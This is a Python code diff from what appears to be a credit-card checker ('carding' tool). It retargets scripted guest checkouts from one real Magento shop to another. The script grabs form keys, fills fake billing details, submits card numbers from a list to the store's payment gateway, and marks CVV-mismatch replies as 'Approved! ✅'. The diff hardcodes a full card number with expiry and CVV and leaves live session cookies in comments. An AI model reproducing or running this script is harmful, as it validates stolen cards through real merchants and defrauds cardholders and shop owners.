@@ -59,149 +59,151 @@ class pafiw:
 
             #self.session.proxies = proxies
             headers = {
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                'Accept-Language': 'es-ES,es;q=0.7',
-                'Cache-Control': 'max-age=0',
-                'Connection': 'keep-alive',
-                'Referer': 'https://www.feisol.net/accessories.html?dir=asc&order=price',
-                'Sec-Fetch-Dest': 'document',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-Site': 'same-origin',
-                'Sec-Fetch-User': '?1',
-                'Sec-GPC': '1',
-                'Upgrade-Insecure-Requests': '1',
-                'User-Agent': Agent,
-                'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'accept-language': 'es-ES,es;q=0.7',
+                'cache-control': 'max-age=0',
+                'priority': 'u=0, i',
+                'referer': 'https://www.golfsub70.com/sub-70-golf-accessories.html?dir=asc&order=price',
+                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
-                # 'Cookie': 'frontend=as3sjrad7snu6mmj8si3or17j2; frontend_cid=XUlZS5eywebhWpni; external_no_cache=1',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'sec-gpc': '1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
+                # 'cookie': 'crisp-client%2Fsession%2F9e2619ed-344c-43b3-b017-35265471f9f2=session_787513d6-5770-4fa2-a141-b825a6bf44c3; frontend=0a0a9a168f35b86a563b82f98d195ba0; cf_clearance=_cwBoly2LdwkJmSZXLnnCPbepx1UWdmIQ4B.iKZtjY4-1780801597-1.2.1.1-FXPVV1yPBDkADgPJWztrVkCk9N1hvD5gTVGoUshU6DnNQo8L0v0s98xNJaA4gRSPCbij9WJLQqvKdStD6gf7QeEi97tcVdEt7g5LEnYjmWw2edOSWydDRlIbE_0AJb0.Z92DTibs8MPm._whOWTvACJTK9D6fLOfDjojg_JxWBf8SzO_l1USUZQuMfbfDcXZigj0Wg4Ftz8T8cORWk6DClIN6drVt1F8fs4IPGTPy24ccbiIqvOS56_hyGbhr.5rMSzJ2ZTZnXjtINxaOZyhcCZIgVT_WBxMz.wLqyFEwrCiI94VHV7Tbd_vqh4uE4gHkr8QyrpEUrVyNKvZPdVg8g; productlist=Category%20-%20Sub%2070%20Golf%20Accessories; googlecategory=Sub%2070%20Golf%20Accessories; external_no_cache=1',
             }
 
-            response = session.get('https://www.feisol.net/accessories/feisol-bubble-level-bl-hs1.html', headers=headers).text
-            key1 = paserX(response, 'name="form_key" type="hidden" value="', '"')
-            print(key1)
+            response = session.get('https://www.golfsub70.com/sub-70-ball-markers.html',  headers=headers).text
+            key = paserX(response, 'name="form_key" type="hidden" value="', '"')
+            print(key)
+
             headers = {
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                'Accept-Language': 'es-ES,es;q=0.7',
-                'Cache-Control': 'max-age=0',
-                'Connection': 'keep-alive',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Origin': 'https://www.feisol.net',
-                'Referer': 'https://www.feisol.net/accessories/feisol-bubble-level-bl-hs1.html',
-                'Sec-Fetch-Dest': 'document',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-Site': 'same-origin',
-                'Sec-Fetch-User': '?1',
-                'Sec-GPC': '1',
-                'Upgrade-Insecure-Requests': '1',
-                'User-Agent': Agent,
-                'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'accept-language': 'es-ES,es;q=0.7',
+                'cache-control': 'max-age=0',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://www.golfsub70.com',
+                'priority': 'u=0, i',
+                'referer': 'https://www.golfsub70.com/sub-70-ball-markers.html',
+                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
-                # 'Cookie': 'frontend=as3sjrad7snu6mmj8si3or17j2; frontend_cid=XUlZS5eywebhWpni; external_no_cache=1',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'sec-gpc': '1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
+                # 'cookie': 'crisp-client%2Fsession%2F9e2619ed-344c-43b3-b017-35265471f9f2=session_787513d6-5770-4fa2-a141-b825a6bf44c3; frontend=0a0a9a168f35b86a563b82f98d195ba0; cf_clearance=_cwBoly2LdwkJmSZXLnnCPbepx1UWdmIQ4B.iKZtjY4-1780801597-1.2.1.1-FXPVV1yPBDkADgPJWztrVkCk9N1hvD5gTVGoUshU6DnNQo8L0v0s98xNJaA4gRSPCbij9WJLQqvKdStD6gf7QeEi97tcVdEt7g5LEnYjmWw2edOSWydDRlIbE_0AJb0.Z92DTibs8MPm._whOWTvACJTK9D6fLOfDjojg_JxWBf8SzO_l1USUZQuMfbfDcXZigj0Wg4Ftz8T8cORWk6DClIN6drVt1F8fs4IPGTPy24ccbiIqvOS56_hyGbhr.5rMSzJ2ZTZnXjtINxaOZyhcCZIgVT_WBxMz.wLqyFEwrCiI94VHV7Tbd_vqh4uE4gHkr8QyrpEUrVyNKvZPdVg8g; productlist=Category%20-%20Sub%2070%20Golf%20Accessories; googlecategory=Sub%2070%20Golf%20Accessories; external_no_cache=1',
             }
 
             data = {
-                'form_key': key1,
-                'product': '240',
+                'form_key': key,
+                'product': '915',
                 'related_product': '',
+                'super_attribute[217]': '436',
                 'qty': '1',
-                'return_url': '',
             }
+
             response = session.post(
-                'https://www.feisol.net/checkout/cart/add/',
+                f'https://www.golfsub70.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuZ29sZnN1YjcwLmNvbS9zdWItNzAtYmFsbC1tYXJrZXJzLmh0bWw,/product/915/form_key/{key}/',
                 headers=headers,
-                data=data
+                data=data,
             )
             headers = {
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                'Accept-Language': 'es-ES,es;q=0.7',
-                'Cache-Control': 'max-age=0',
-                'Connection': 'keep-alive',
-                'Referer': 'https://www.feisol.net/accessories/feisol-bubble-level-bl-hs1.html',
-                'Sec-Fetch-Dest': 'document',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-Site': 'same-origin',
-                'Sec-Fetch-User': '?1',
-                'Sec-GPC': '1',
-                'Upgrade-Insecure-Requests': '1',
-                'User-Agent': Agent,
-                'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'accept-language': 'es-ES,es;q=0.7',
+                'cache-control': 'max-age=0',
+                'priority': 'u=0, i',
+                'referer': 'https://www.golfsub70.com/sub-70-ball-markers.html',
+                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
-                # 'Cookie': 'frontend=as3sjrad7snu6mmj8si3or17j2; frontend_cid=XUlZS5eywebhWpni; external_no_cache=1',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'sec-gpc': '1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
+                # 'cookie': 'crisp-client%2Fsession%2F9e2619ed-344c-43b3-b017-35265471f9f2=session_787513d6-5770-4fa2-a141-b825a6bf44c3; frontend=0a0a9a168f35b86a563b82f98d195ba0; cf_clearance=_cwBoly2LdwkJmSZXLnnCPbepx1UWdmIQ4B.iKZtjY4-1780801597-1.2.1.1-FXPVV1yPBDkADgPJWztrVkCk9N1hvD5gTVGoUshU6DnNQo8L0v0s98xNJaA4gRSPCbij9WJLQqvKdStD6gf7QeEi97tcVdEt7g5LEnYjmWw2edOSWydDRlIbE_0AJb0.Z92DTibs8MPm._whOWTvACJTK9D6fLOfDjojg_JxWBf8SzO_l1USUZQuMfbfDcXZigj0Wg4Ftz8T8cORWk6DClIN6drVt1F8fs4IPGTPy24ccbiIqvOS56_hyGbhr.5rMSzJ2ZTZnXjtINxaOZyhcCZIgVT_WBxMz.wLqyFEwrCiI94VHV7Tbd_vqh4uE4gHkr8QyrpEUrVyNKvZPdVg8g; productlist=Category%20-%20Sub%2070%20Golf%20Accessories; googlecategory=Sub%2070%20Golf%20Accessories; external_no_cache=1',
             }
 
-            response = session.get('https://www.feisol.net/checkout/cart/',  headers=headers).text
-            fromkey2 = paserX(response, 'name="form_key" type="hidden" value="', '"')
-            print(fromkey2)
+            response = session.get('https://www.golfsub70.com/checkout/cart/', headers=headers)
             headers = {
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                'Accept-Language': 'es-ES,es;q=0.7',
-                'Connection': 'keep-alive',
-                'Referer': 'https://www.feisol.net/checkout/cart/',
-                'Sec-Fetch-Dest': 'document',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-Site': 'same-origin',
-                'Sec-Fetch-User': '?1',
-                'Sec-GPC': '1',
-                'Upgrade-Insecure-Requests': '1',
-                'User-Agent': Agent,
-                'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'accept-language': 'es-ES,es;q=0.7',
+                'priority': 'u=0, i',
+                'referer': 'https://www.golfsub70.com/checkout/cart/',
+                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
-                # 'Cookie': 'frontend=as3sjrad7snu6mmj8si3or17j2; frontend_cid=XUlZS5eywebhWpni; external_no_cache=1',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'sec-gpc': '1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
+                # 'cookie': 'crisp-client%2Fsession%2F9e2619ed-344c-43b3-b017-35265471f9f2=session_787513d6-5770-4fa2-a141-b825a6bf44c3; frontend=0a0a9a168f35b86a563b82f98d195ba0; cf_clearance=_cwBoly2LdwkJmSZXLnnCPbepx1UWdmIQ4B.iKZtjY4-1780801597-1.2.1.1-FXPVV1yPBDkADgPJWztrVkCk9N1hvD5gTVGoUshU6DnNQo8L0v0s98xNJaA4gRSPCbij9WJLQqvKdStD6gf7QeEi97tcVdEt7g5LEnYjmWw2edOSWydDRlIbE_0AJb0.Z92DTibs8MPm._whOWTvACJTK9D6fLOfDjojg_JxWBf8SzO_l1USUZQuMfbfDcXZigj0Wg4Ftz8T8cORWk6DClIN6drVt1F8fs4IPGTPy24ccbiIqvOS56_hyGbhr.5rMSzJ2ZTZnXjtINxaOZyhcCZIgVT_WBxMz.wLqyFEwrCiI94VHV7Tbd_vqh4uE4gHkr8QyrpEUrVyNKvZPdVg8g; googlecategory=Sub%2070%20Golf%20Accessories; external_no_cache=1',
             }
 
-            response = session.get('https://www.feisol.net/checkout/onepage/', headers=headers)
+            response = session.get('https://www.golfsub70.com/checkout/onepage/',  headers=headers).text
+
             headers = {
-                'Accept': 'text/javascript, text/html, application/xml, text/xml, */*',
-                'Accept-Language': 'es-ES,es;q=0.7',
-                'Connection': 'keep-alive',
-                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'Origin': 'https://www.feisol.net',
-                'Referer': 'https://www.feisol.net/checkout/onepage/',
-                'Sec-Fetch-Dest': 'empty',
-                'Sec-Fetch-Mode': 'cors',
-                'Sec-Fetch-Site': 'same-origin',
-                'Sec-GPC': '1',
-                'User-Agent': Agent,
-                'X-Prototype-Version': '1.7',
-                'X-Requested-With': 'XMLHttpRequest',
-                'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
+                'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
+                'accept-language': 'es-ES,es;q=0.7',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'origin': 'https://www.golfsub70.com',
+                'priority': 'u=1, i',
+                'referer': 'https://www.golfsub70.com/checkout/onepage/',
+                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
-                # 'Cookie': 'frontend=as3sjrad7snu6mmj8si3or17j2; frontend_cid=XUlZS5eywebhWpni; external_no_cache=1',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'sec-gpc': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
+                'x-prototype-version': '1.7',
+                'x-requested-with': 'XMLHttpRequest',
+                # 'cookie': 'crisp-client%2Fsession%2F9e2619ed-344c-43b3-b017-35265471f9f2=session_787513d6-5770-4fa2-a141-b825a6bf44c3; frontend=0a0a9a168f35b86a563b82f98d195ba0; cf_clearance=_cwBoly2LdwkJmSZXLnnCPbepx1UWdmIQ4B.iKZtjY4-1780801597-1.2.1.1-FXPVV1yPBDkADgPJWztrVkCk9N1hvD5gTVGoUshU6DnNQo8L0v0s98xNJaA4gRSPCbij9WJLQqvKdStD6gf7QeEi97tcVdEt7g5LEnYjmWw2edOSWydDRlIbE_0AJb0.Z92DTibs8MPm._whOWTvACJTK9D6fLOfDjojg_JxWBf8SzO_l1USUZQuMfbfDcXZigj0Wg4Ftz8T8cORWk6DClIN6drVt1F8fs4IPGTPy24ccbiIqvOS56_hyGbhr.5rMSzJ2ZTZnXjtINxaOZyhcCZIgVT_WBxMz.wLqyFEwrCiI94VHV7Tbd_vqh4uE4gHkr8QyrpEUrVyNKvZPdVg8g; googlecategory=Sub%2070%20Golf%20Accessories; external_no_cache=1',
             }
 
             data = {
                 'method': 'guest',
             }
 
-            response = session.post('https://www.feisol.net/checkout/onepage/saveMethod/', headers=headers, data=data)
+            response = session.post('https://www.golfsub70.com/checkout/onepage/saveMethod/', headers=headers, data=data)
             headers = {
-                'Accept': 'text/javascript, text/html, application/xml, text/xml, */*',
-                'Accept-Language': 'es-ES,es;q=0.7',
-                'Connection': 'keep-alive',
-                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'Origin': 'https://www.feisol.net',
-                'Referer': 'https://www.feisol.net/checkout/onepage/',
-                'Sec-Fetch-Dest': 'empty',
-                'Sec-Fetch-Mode': 'cors',
-                'Sec-Fetch-Site': 'same-origin',
-                'Sec-GPC': '1',
-                'User-Agent': Agent,
-                'X-Prototype-Version': '1.7',
-                'X-Requested-With': 'XMLHttpRequest',
-                'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
+                'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
+                'accept-language': 'es-ES,es;q=0.7',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'origin': 'https://www.golfsub70.com',
+                'priority': 'u=1, i',
+                'referer': 'https://www.golfsub70.com/checkout/onepage/',
+                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
-                # 'Cookie': 'frontend=as3sjrad7snu6mmj8si3or17j2; frontend_cid=XUlZS5eywebhWpni; external_no_cache=1',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'sec-gpc': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
+                'x-prototype-version': '1.7',
+                'x-requested-with': 'XMLHttpRequest',
+                # 'cookie': 'crisp-client%2Fsession%2F9e2619ed-344c-43b3-b017-35265471f9f2=session_787513d6-5770-4fa2-a141-b825a6bf44c3; frontend=0a0a9a168f35b86a563b82f98d195ba0; cf_clearance=_cwBoly2LdwkJmSZXLnnCPbepx1UWdmIQ4B.iKZtjY4-1780801597-1.2.1.1-FXPVV1yPBDkADgPJWztrVkCk9N1hvD5gTVGoUshU6DnNQo8L0v0s98xNJaA4gRSPCbij9WJLQqvKdStD6gf7QeEi97tcVdEt7g5LEnYjmWw2edOSWydDRlIbE_0AJb0.Z92DTibs8MPm._whOWTvACJTK9D6fLOfDjojg_JxWBf8SzO_l1USUZQuMfbfDcXZigj0Wg4Ftz8T8cORWk6DClIN6drVt1F8fs4IPGTPy24ccbiIqvOS56_hyGbhr.5rMSzJ2ZTZnXjtINxaOZyhcCZIgVT_WBxMz.wLqyFEwrCiI94VHV7Tbd_vqh4uE4gHkr8QyrpEUrVyNKvZPdVg8g; googlecategory=Sub%2070%20Golf%20Accessories; external_no_cache=1',
             }
 
             data = {
                 'billing[address_id]': '',
                 'billing[firstname]': 'ldfl',
+                'billing[middlename]': 'mr',
                 'billing[lastname]': 'dsdasd',
                 'billing[company]': 'ggd',
                 'billing[email]': CorreoRand,
@@ -215,123 +217,120 @@ class pafiw:
                 'billing[postcode]': '10080',
                 'billing[country_id]': 'US',
                 'billing[telephone]': '0989861371',
-                'billing[fax]': '0989861371',
+                'billing[fax]': '',
                 'billing[customer_password]': '',
                 'billing[confirm_password]': '',
                 'billing[save_in_address_book]': '1',
                 'billing[use_for_shipping]': '1',
-                'form_key': fromkey2,
+                'form_key': key,
             }
 
-            response = session.post('https://www.feisol.net/checkout/onepage/saveBilling/',  headers=headers, data=data)
-
+            response = session.post('https://www.golfsub70.com/checkout/onepage/saveBilling/', headers=headers, data=data)
             headers = {
-                'Accept': 'text/javascript, text/html, application/xml, text/xml, */*',
-                'Accept-Language': 'es-ES,es;q=0.7',
-                'Connection': 'keep-alive',
-                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'Origin': 'https://www.feisol.net',
-                'Referer': 'https://www.feisol.net/checkout/onepage/',
-                'Sec-Fetch-Dest': 'empty',
-                'Sec-Fetch-Mode': 'cors',
-                'Sec-Fetch-Site': 'same-origin',
-                'Sec-GPC': '1',
-                'User-Agent': Agent,
-                'X-Prototype-Version': '1.7',
-                'X-Requested-With': 'XMLHttpRequest',
-                'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
+                'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
+                'accept-language': 'es-ES,es;q=0.7',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'origin': 'https://www.golfsub70.com',
+                'priority': 'u=1, i',
+                'referer': 'https://www.golfsub70.com/checkout/onepage/',
+                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
-                # 'Cookie': 'frontend=as3sjrad7snu6mmj8si3or17j2; frontend_cid=XUlZS5eywebhWpni; external_no_cache=1',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'sec-gpc': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
+                'x-prototype-version': '1.7',
+                'x-requested-with': 'XMLHttpRequest',
+                # 'cookie': 'crisp-client%2Fsession%2F9e2619ed-344c-43b3-b017-35265471f9f2=session_787513d6-5770-4fa2-a141-b825a6bf44c3; frontend=0a0a9a168f35b86a563b82f98d195ba0; cf_clearance=_cwBoly2LdwkJmSZXLnnCPbepx1UWdmIQ4B.iKZtjY4-1780801597-1.2.1.1-FXPVV1yPBDkADgPJWztrVkCk9N1hvD5gTVGoUshU6DnNQo8L0v0s98xNJaA4gRSPCbij9WJLQqvKdStD6gf7QeEi97tcVdEt7g5LEnYjmWw2edOSWydDRlIbE_0AJb0.Z92DTibs8MPm._whOWTvACJTK9D6fLOfDjojg_JxWBf8SzO_l1USUZQuMfbfDcXZigj0Wg4Ftz8T8cORWk6DClIN6drVt1F8fs4IPGTPy24ccbiIqvOS56_hyGbhr.5rMSzJ2ZTZnXjtINxaOZyhcCZIgVT_WBxMz.wLqyFEwrCiI94VHV7Tbd_vqh4uE4gHkr8QyrpEUrVyNKvZPdVg8g; googlecategory=Sub%2070%20Golf%20Accessories; external_no_cache=1',
             }
 
             data = {
-                'shipping_method': 'tablerate_bestway',
-                'form_key': fromkey2,
+                'shipping_method': 'wigsubship_carrier_standand',
+                'form_key': key,
             }
 
             response = session.post(
-                'https://www.feisol.net/checkout/onepage/saveShippingMethod/',
+                'https://www.golfsub70.com/checkout/onepage/saveShippingMethod/',
                 headers=headers,
                 data=data,
             )
             headers = {
-                'Accept': 'text/javascript, text/html, application/xml, text/xml, */*',
-                'Accept-Language': 'es-ES,es;q=0.7',
-                'Connection': 'keep-alive',
-                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'Origin': 'https://www.feisol.net',
-                'Referer': 'https://www.feisol.net/checkout/onepage/',
-                'Sec-Fetch-Dest': 'empty',
-                'Sec-Fetch-Mode': 'cors',
-                'Sec-Fetch-Site': 'same-origin',
-                'Sec-GPC': '1',
-                'User-Agent': Agent,
-                'X-Prototype-Version': '1.7',
-                'X-Requested-With': 'XMLHttpRequest',
-                'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
+                'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
+                'accept-language': 'es-ES,es;q=0.7',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'origin': 'https://www.golfsub70.com',
+                'priority': 'u=1, i',
+                'referer': 'https://www.golfsub70.com/checkout/onepage/',
+                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
-                # 'Cookie': 'frontend=as3sjrad7snu6mmj8si3or17j2; frontend_cid=XUlZS5eywebhWpni; external_no_cache=1',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'sec-gpc': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
+                'x-prototype-version': '1.7',
+                'x-requested-with': 'XMLHttpRequest',
+                # 'cookie': 'crisp-client%2Fsession%2F9e2619ed-344c-43b3-b017-35265471f9f2=session_787513d6-5770-4fa2-a141-b825a6bf44c3; frontend=0a0a9a168f35b86a563b82f98d195ba0; cf_clearance=_cwBoly2LdwkJmSZXLnnCPbepx1UWdmIQ4B.iKZtjY4-1780801597-1.2.1.1-FXPVV1yPBDkADgPJWztrVkCk9N1hvD5gTVGoUshU6DnNQo8L0v0s98xNJaA4gRSPCbij9WJLQqvKdStD6gf7QeEi97tcVdEt7g5LEnYjmWw2edOSWydDRlIbE_0AJb0.Z92DTibs8MPm._whOWTvACJTK9D6fLOfDjojg_JxWBf8SzO_l1USUZQuMfbfDcXZigj0Wg4Ftz8T8cORWk6DClIN6drVt1F8fs4IPGTPy24ccbiIqvOS56_hyGbhr.5rMSzJ2ZTZnXjtINxaOZyhcCZIgVT_WBxMz.wLqyFEwrCiI94VHV7Tbd_vqh4uE4gHkr8QyrpEUrVyNKvZPdVg8g; googlecategory=Sub%2070%20Golf%20Accessories; external_no_cache=1',
             }
 
             data = {
-                'payment[method]': 'paypal_direct',
+                'payment[method]': 'verisign',
+                'payment[cc_type]': 'MC',
+                'payment[cc_number]': '5492840390681107',
+                'payment[cc_exp_month]': '12',
+                'payment[cc_exp_year]': '2028',
+                'payment[cc_cid]': '269',
+                'form_key': key,
+            }
+
+            response = session.post('https://www.golfsub70.com/checkout/onepage/savePayment/',  headers=headers, data=data)
+
+            headers = {
+                'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
+                'accept-language': 'es-ES,es;q=0.7',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'origin': 'https://www.golfsub70.com',
+                'priority': 'u=1, i',
+                'referer': 'https://www.golfsub70.com/checkout/onepage/',
+                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'sec-gpc': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
+                'x-prototype-version': '1.7',
+                'x-requested-with': 'XMLHttpRequest',
+                # 'cookie': 'crisp-client%2Fsession%2F9e2619ed-344c-43b3-b017-35265471f9f2=session_787513d6-5770-4fa2-a141-b825a6bf44c3; frontend=0a0a9a168f35b86a563b82f98d195ba0; cf_clearance=_cwBoly2LdwkJmSZXLnnCPbepx1UWdmIQ4B.iKZtjY4-1780801597-1.2.1.1-FXPVV1yPBDkADgPJWztrVkCk9N1hvD5gTVGoUshU6DnNQo8L0v0s98xNJaA4gRSPCbij9WJLQqvKdStD6gf7QeEi97tcVdEt7g5LEnYjmWw2edOSWydDRlIbE_0AJb0.Z92DTibs8MPm._whOWTvACJTK9D6fLOfDjojg_JxWBf8SzO_l1USUZQuMfbfDcXZigj0Wg4Ftz8T8cORWk6DClIN6drVt1F8fs4IPGTPy24ccbiIqvOS56_hyGbhr.5rMSzJ2ZTZnXjtINxaOZyhcCZIgVT_WBxMz.wLqyFEwrCiI94VHV7Tbd_vqh4uE4gHkr8QyrpEUrVyNKvZPdVg8g; googlecategory=Sub%2070%20Golf%20Accessories; external_no_cache=1',
+            }
+
+            data = {
+                'payment[method]': 'verisign',
                 'payment[cc_type]': self.brand,
                 'payment[cc_number]': self.ccs[0],
                 'payment[cc_exp_month]': self.ccs[1],
                 'payment[cc_exp_year]': self.ccs[2],
                 'payment[cc_cid]': self.ccs[3],
-                'form_key': fromkey2,
-            }
-
-            response = session.post('https://www.feisol.net/checkout/onepage/savePayment/', headers=headers, data=data)
-
-            headers = {
-                'Accept': 'text/javascript, text/html, application/xml, text/xml, */*',
-                'Accept-Language': 'es-ES,es;q=0.7',
-                'Connection': 'keep-alive',
-                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'Origin': 'https://www.feisol.net',
-                'Referer': 'https://www.feisol.net/checkout/onepage/',
-                'Sec-Fetch-Dest': 'empty',
-                'Sec-Fetch-Mode': 'cors',
-                'Sec-Fetch-Site': 'same-origin',
-                'Sec-GPC': '1',
-                'User-Agent':Agent,
-                'X-Prototype-Version': '1.7',
-                'X-Requested-With': 'XMLHttpRequest',
-                'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                # 'Cookie': 'frontend=as3sjrad7snu6mmj8si3or17j2; frontend_cid=XUlZS5eywebhWpni; external_no_cache=1',
-            }
-
-            data = {
-                'payment[method]': 'paypal_direct',
-                'payment[cc_type]': self.brand,
-                'payment[cc_number]': self.ccs[0],
-                'payment[cc_exp_month]': self.ccs[1],
-                'payment[cc_exp_year]': self.ccs[2],
-                'payment[cc_cid]': self.ccs[3],
-                'form_key': fromkey2,
-                'cdr_ordercomment': '',
+                'form_key': key,
             }
 
             response = session.post(
-                f'https://www.feisol.net/checkout/onepage/saveOrder/form_key/{fromkey2}/',
+                f'https://www.golfsub70.com/checkout/onepage/saveOrder/form_key/{key}/',
                 headers=headers,
                 data=data,
-            )
-            data = response.json()
-            err = data.get("error_messages")
-            
-            # payflow woo 18.08
+            ).json()
+            err = response['error_messages']
+                        
+                        # payflow woo 18.08
             if data.get("success") is True:
                 return 'Approved! ✅', 'Charged 10.85'
 
 
-            elif 'PayPal gateway has rejected request. This transaction cannot be processed. Please enter a valid Credit Card Verification Number (#15004: Gateway Decline)' in str(err):
+            elif 'CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.' in str(err):
                 return 'Approved! ✅', err
 
